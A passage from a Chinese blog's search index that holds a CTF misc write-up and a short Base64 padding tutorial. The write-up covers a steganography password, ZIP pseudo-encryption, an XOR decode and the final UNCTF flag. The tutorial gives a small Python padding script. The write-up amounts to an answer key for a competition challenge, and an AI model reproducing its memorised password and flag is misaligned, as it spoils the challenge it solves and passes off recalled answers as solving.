src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-18_08-38-16.png" alt="Snipaste_2022-11-18_08-38-16"></p><p>为什么要这样？因为bmp里面没有密码可以更改了，而且提示是<code>带密码的eye</code>，但是bmp就没有密码修改的地方，所以我想起来了之前bugku做的一道题目，就是用了上面的手段，题目叫什么我忘记了。</p><p>所以我就各种尝试，最后试出来了：<code>Image quality: normal，Type:AES256，Key:P@SsW0RD</code>。</p><ol start="3"><li>这一步的时候，<code>flag.txt</code>是加密的，而<code>看好你.jpg</code>是没有加密的。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118101734485.png" alt="image-20221118101734485"></p><ol start="4"><li>大胆猜测伪加密，直接010editor改了一下</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118101852038.png" alt="image-20221118101852038"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118101907400.png" alt="image-20221118101907400"></p><ol start="5"><li>现在一看就没有密码了吧</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118101628301.png" alt="image-20221118101628301"></p><ol start="6"><li><code>flag.txt</code>内容如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3(%2 .V%QSQTP KRPV_K&quot; &#x27;RKPWS KWQ%Q&#x27;W$QWPS&quot;.</span><br></pre></td></tr></table></figure><p>还有一张图片<code>看好你.jpg</code>：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118102027050.png" alt="image-20221118102027050"></p><ol start="7"><li>我还以为还有隐写，试了很多工具，试了<code>3(%2 .V%QSQTP KRPV_K&quot; &#39;RKPWS KWQ%Q&#39;W$QWPS&quot;.</code>和<code>P@SsW0RD</code>作为密码，都没成功，又卡住了。</li><li>我就试了rot47甚至在cyberchef中各种尝试</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118102312623.png" alt="image-20221118102312623"></p><ol start="9"><li>我也试过xortool，不太行，可能是因为这个的字符太少了；最后原来还是xor。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118102431802.png" alt="image-20221118102431802"></p><p><strong>UNCTFH0C75726F-4609-DFA4-615F-17C7A1B7165DH</strong></p><ol start="10"><li>这个一看就是uuid生成的flag，根据uuid的格式<code>8-4-4-4-12</code>，很明显就能知道，需要替换那两个英文字符喽！</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118102610140.png" alt="image-20221118102610140"></p><p><strong>UNCTF{0C75726F-4609-DFA4-615F-17C7A1B7165D}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Base64补全原理（以及代码）</title>
      <link href="/posts/36937.html"/>
      <url>/posts/36937.html</url>
      
        <content type="html"><![CDATA[<h1 id="补全原理"><a href="#补全原理" class="headerlink" title="补全原理"></a>补全原理</h1><p>base64编码后的字符串，每4字节一组。</p><hr><p>例子：（下面的base64编码后的字符串都没有 <code>=</code> 符号）</p><table><thead><tr><th>编码后</th><th>len</th><th>补全几个 <code>=</code> 符号</th><th>补全后</th><th>解码后</th></tr></thead><tbody><tr><td>aGVsbA</td><td>6</td><td>4 - (6 % 4) &#x3D; 2</td><td>aGVsbA&#x3D;&#x3D;</td><td>hell</td></tr><tr><td>aGVsbG8</td><td>7</td><td>4 - (7 % 4) &#x3D; 1</td><td>aGVsbG8&#x3D;</td><td>hello</td></tr><tr><td>aGVsbG93</td><td>8</td><td>8 % 4 &#x3D;&#x3D; 0，所以不需要补</td><td>aGVsbG93</td><td>hellow</td></tr></tbody></table><p>代码逻辑：</p><ul><li>1.先用 <code>len % 4</code> 如果等于0，就说明不需要补<code>=</code></li><li>2.<code>len % 4</code> 不等于0，就说明需要补<code>=</code>，末尾补全 <code>4 - (len % 4)</code> 位 <code>=</code></li></ul><hr><p>Python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wf = <span class="built_in">open</span>(<span class="string">&quot;base64_str补全=后.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;base64_str.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    data = data.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    missing_padding = <span class="built_in">len</span>(line) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> missing_padding != <span class="number">0</span>:</span><br><span class="line">        line += <span class="string">&quot;=&quot;</span> * (<span class="number">4</span> - missing_padding)</span><br><span class="line">    wf.write(line + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
